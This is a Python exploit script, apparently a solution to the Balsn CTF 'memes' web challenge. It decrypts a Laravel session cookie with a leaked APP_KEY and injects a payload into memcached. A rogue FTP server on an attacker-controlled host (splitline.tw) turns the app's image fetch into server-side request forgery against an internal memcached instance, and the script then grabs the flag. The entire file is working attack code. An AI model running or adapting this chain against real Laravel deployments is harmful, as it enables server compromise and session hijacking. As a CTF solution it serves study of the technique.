import socket
import os
import requests
import base64
import json
import time
import threading

# get by filters_chain_oracle_exploit.py
APP_KEY = 'C9UYpnpK1fIE5u42UNDCAleA9HaYx2ziajs7vj9i1Cw='

HOST = 'http://memes.balsnctf.com'
ATTACKER_HOST = 'splitline.tw'


def decrypt_sessid(cookie):
    data = json.loads(base64.b64decode(cookie.replace('%3D', '=')))
    iv = data['iv']
    cipher = data['value']
    plain = os.popen(
        f'php -r \'echo openssl_decrypt(base64_decode("{cipher}"), "AES-256-CBC", base64_decode("{APP_KEY}"), OPENSSL_RAW_DATA, base64_decode("{iv}"));\''
    ).read()
    session_id = plain.split('|')[1]
    return session_id


def prepare():
    cookie = requests.get(HOST + '/?image=memes/genshin.png').cookies
    # inject payload (memcached)
    session_id = decrypt_sessid(cookie['laravel_session'])
    os.system(f'php inject.php {session_id}')
    return cookie


def get_image(conn):
    print('1. get_image')
    conn.send(b"220 FTP Server\n")
    print(conn.recv(200))  # USER
    conn.send(b"331 Please specify the password.\n")
    print(conn.recv(200))  # PASS
    conn.send(b"230 Login successful.\n")
    print(conn.recv(200))  # TYPE I
    conn.send(b"200 Switching to Binary mode.\n")
    print(conn.recv(200))  # SIZE
    conn.send(b"213 0\n")
    print(conn.recv(200))  # EPSV
    conn.send(b"229 Entering Extended Passive Mode (|||48763|).\n")
    print(conn.recv(200))  # RETR
    conn.send(b"150 Ok to send data.\n")
    conn.send(b"226 Transfer complete.\n")
    print(conn.recv(200))  # QUIT
    conn.send(b"221 Goodbye.\n")


def file_exists(conn):
    print('2. file_exists')
    conn.send(b"220 FTP Server\n")
    print(conn.recv(200))  # USER
    conn.send(b"331 Please specify the password.\n")
    print(conn.recv(200))  # PASS
    conn.send(b"230 Login successful.\n")
    print(conn.recv(200))  # CWD
    conn.send(b"250 Directory successfully changed.\n")
    print(conn.recv(200))  # TYPE I
    conn.send(b"200 Switching to Binary mode.\n")
    print(conn.recv(200))  # SIZE
    conn.send(b"213 0\n")
    print(conn.recv(200))  # MDTM
    conn.send(b"213 20230201000000\n")
    print(conn.recv(200))  # ''
    conn.send(b"221 Goodbye.\n")


def put(conn):
    print('3. put')
    conn.send(b"220 FTP Server\n")
    print(conn.recv(200))
    conn.send(b"331 Please specify the password.\n")
    print(conn.recv(200))
    conn.send(b"230 Login successful.\n")
    print(conn.recv(200))
    conn.send(b"200 Switching to Binary mode.\n")
    print(conn.recv(200))
    conn.send(b"550 Could not get file size.\n")
    print(conn.recv(200))
    ip = '10.87.0.2'.replace('.', ',')
    port = 11211
    # time.sleep(.5)
    conn.send(f"227 {ip},0,{port}\n".encode())
    print(conn.recv(200))
    # time.sleep(.5)
    conn.send(f"227 {ip},0,{port}\n".encode())
    print(conn.recv(200))
    conn.send(b"150 Ok to send data.\n")
    conn.send(b"226 Transfer complete.\n")
    print(conn.recv(200))
    conn.send(b"221 Goodbye.\n")
    conn.close()


def main():
    cookie = prepare()

    host, port = '0.0.0.0', 21
    s = socket.socket()
    s.bind((host, port))
    s.listen(5)

    # ftp stuff

    def image_srv():
        host = '0.0.0.0'
        port = 48763
        sk = socket.socket()
        sk.bind((host, port))
        sk.listen(5)
        print('[data_srv] listening on port 48763')

        conn, address = sk.accept()
        conn.send(open('out.png', 'rb').read())
        conn.close()

    threading.Thread(target=image_srv).start()

    def req():
        time.sleep(.5)
        r = requests.get(HOST + '/?image=memes/genshin')
        csrf = r.text.split('_token" value="')[1].split('"')[0]
        r = requests.post(
            HOST + "/make",
            cookies=r.cookies,
            data={
                "_token": csrf,
                "texts[0][text]": "",
                "texts[0][x]": "10000",
                "texts[0][y]": "10000",
                "texts[0][size]": "32",
                "texts[0][color]": "#000000",
                "texts[0][angle]": "0",
                "image": f"ftp://{ATTACKER_HOST}/whatever",
            }
        )

    threading.Thread(target=req).start()

    conn, address = s.accept()
    get_image(conn)

    conn, address = s.accept()
    file_exists(conn)

    conn, address = s.accept()
    put(conn)

    # trigger
    r = requests.get(HOST + '/list', cookies=cookie)
    print("FLAG:", r.text.splitlines()[0])

    conn.close()


if __name__ == '__main__':
    main()
